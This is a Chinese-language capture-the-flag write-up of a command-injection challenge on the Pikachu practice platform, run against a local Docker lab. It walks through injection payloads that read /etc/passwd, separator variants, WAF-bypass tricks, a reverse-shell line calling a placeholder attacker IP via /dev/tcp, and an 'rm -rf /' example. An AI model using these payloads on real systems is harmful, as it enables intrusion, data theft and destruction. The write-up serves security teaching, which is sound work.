RCE exec "ping" - Pikachu Writeup

2026年9月19日 Pikachu Web安全 RCE

一、题目信息

  • 题目名称：RCE exec "ping"
  • 题目平台：Pikachu 漏洞练习平台
  • 题目类型：Web安全 / 远程命令执行（RCE） / 命令注入
  • 靶场链接：http://localhost:8080/vul/rce/rce_ping.php（本地 Docker 环境）
  • 涉及工具：浏览器（Chrome/Firefox）、终端（Terminal）

二、解题步骤

1. 分析题目考什么

本题的核心考点是系统命令注入（Command Injection）。后端提供了一个 Ping 功能，用于探测目标 IP 的连通性。如果后端代码直接使用字符串拼接的方式，将用户输入的 IP 参数拼接到系统命令中（例如 ping -c 4 $ip），攻击者就可以利用 Linux 命令连接符（如 ;、|、&），在合法命令后追加执行任意恶意系统命令，从而接管服务器。

2. 怎么想（破题思路）

页面提示“Here, please enter the target IP address!”。解题思路如下：

  • 首先输入 127.0.0.1，确认 Ping 功能正常，页面会回显 Ping 结果。
  • 尝试使用分号 ; 作为命令分隔符。输入 127.0.0.1; whoami，观察页面是否在 Ping 结果后额外显示系统用户名。
  • 若成功，进一步利用 cat 命令读取服务器敏感文件（如 /etc/passwd），证明漏洞存在。

3. 怎么解（详细步骤与踩坑记录）

踩坑记录一：命令分隔符被过滤

踩坑情况：使用 127.0.0.1; cat /etc/passwd 时，如果后端代码使用了黑名单过滤掉 ;，则注入会失败。

原因分析：后端可能只拦截了部分命令分隔符，或者对特殊字符做了转义。

改进方式：尝试其他 Linux 命令连接符，如管道符 |、逻辑与 &&、逻辑或 || 或反引号 `命令`。例如：127.0.0.1 | whoami 或 127.0.0.1 && whoami。

踩坑记录二：输入内容被 URL 编码

踩坑情况：在输入框直接输入包含空格和特殊符号的 Payload，点击提交后，可能因为前端表单自动编码导致后端解析出错。

原因分析：浏览器会对表单内容进行 URL 编码（如空格变为 %20），如果后端未做正确的解码，命令可能无法执行。

改进方式：使用 Burp Suite 抓包或浏览器 F12 Network 面板，查看实际发送的 Payload，必要时手动修改数据包，或使用 %09（Tab 键）等替代空格绕过。

终极解法：利用分号执行任意命令

在输入框中提交以下 Payload：

127.0.0.1; cat /etc/passwd

代码逐个符号深度解析：

  • 127.0.0.1：合法的 IP 地址，用于完成正常的 Ping 命令。
  • ;：Linux 命令分隔符。它告诉系统，执行完前一条命令后，立即执行后一条命令。
  • cat：Linux 系统中的常用命令，用于读取并输出文件内容。
  • /etc/passwd：Linux 系统中存储用户账户信息的核心敏感文件。

提交后，后端执行的系统命令变为 ping -c 4 127.0.0.1; cat /etc/passwd。页面成功回显了系统的用户列表，证明命令注入攻击成功。

4. 怎么迁移（跨领域联想）

  • 反弹 Shell（Reverse Shell）：在实战中，攻击者通常不会只看一眼 /etc/passwd，而是利用命令注入写入反弹 Shell 命令（如 bash -i >& /dev/tcp/攻击者IP/端口 0>&1），从而获得一个交互式的服务器控制终端。
  • 代码审计：在审计 PHP 或 Java 代码时，应重点关注 exec()、system()、shell_exec()、passthru() 等危险函数。如果其参数直接使用了用户输入且未做过滤，即可判定为 RCE 漏洞。
  • WAF 绕过：在真实攻防中，WAF 通常会拦截 ;、| 和 cat 等关键字。攻击者会尝试使用编码绕过（如 c\at、c"at"）、变量拼接（如 a=c;b=at;$a$b）等方式进行绕过。

三、名词大全与原理深度复盘

1. RCE（Remote Command Execution）

远程命令执行漏洞。指攻击者通过 Web 应用接口，将恶意系统命令注入到服务器后端执行，从而获得服务器操作权限。RCE 是 Web 安全中危害等级最高的漏洞之一，相当于服务器被直接控制。

2. Linux 命令连接符

在 Linux Shell 中，常用的命令连接符有：

  • ;：顺序执行，无论前一条命令成功与否，后一条都会执行。
  • |：管道符，将前一条命令的输出作为后一条命令的输入。
  • &&：逻辑与，前一条命令执行成功（返回 0）时，后一条才会执行。
  • ||：逻辑或，前一条命令执行失败时，后一条才会执行。

3. 为什么会有命令注入漏洞？

Web 应用为了实现某些系统级功能（如 Ping 测试、文件处理、系统监控），会调用操作系统底层的命令。如果开发者使用了字符串拼接来构造命令，没有对用户输入进行严格的过滤或转义，攻击者就能通过构造特殊字符，欺骗操作系统执行额外的恶意命令。

四、题目思考

1. 这跟前面的题有什么区别？

  • 与 SQL 注入相比：SQL 注入攻击的是后端的数据库，窃取或篡改数据；RCE 攻击的是操作系统，直接获取服务器最高权限，两者的危害级别和攻击目标完全不同。
  • 与文件上传漏洞相比：文件上传需要绕过前端和后端的文件类型检测，最终目的是上传 WebShell；RCE 命令注入不需要上传文件，直接在请求中执行命令，利用更加直接。

2. 这种题目的出现原因（为什么存在）

这类漏洞的出现，是因为开发者在编写调用系统命令的代码时，过度信任了用户的输入。例如，直接编写 exec("ping -c 4 " . $_POST['ip'])。开发人员未考虑到用户可能输入 127.0.0.1; rm -rf / 这样的恶意指令，导致系统命令被非法拼接执行。

3. 这种应用在实际中如何体现？

在实际的渗透测试中，RCE 是攻击者的终极目标之一。一旦发现 RCE 漏洞，攻击者会立即尝试写入木马、创建管理员用户、连接内网其他机器，或者植入挖矿程序。在企业安全建设中，RCE 漏洞通常被列为最高危、最优先修复的漏洞类型。

4. 如何抽象理解概念（大白话理解）

如果把服务器比作一个餐厅厨房：

  • 正常功能：你点了一份“蛋炒饭”（输入 127.0.0.1），厨师正常做了一份给你。
  • 命令注入：你在点单时，加了一句：“来一份蛋炒饭，顺便把厨房所有的食材都扔了（; rm -rf /）”。如果厨师是个只会照本宣科的机器人，它就会既做蛋炒饭，又把厨房毁了。
  • 结论：命令注入的本质是，利用系统命令分隔符，让服务器在完成正常功能的同时，执行额外的恶意操作。这是极其危险的安全漏洞。
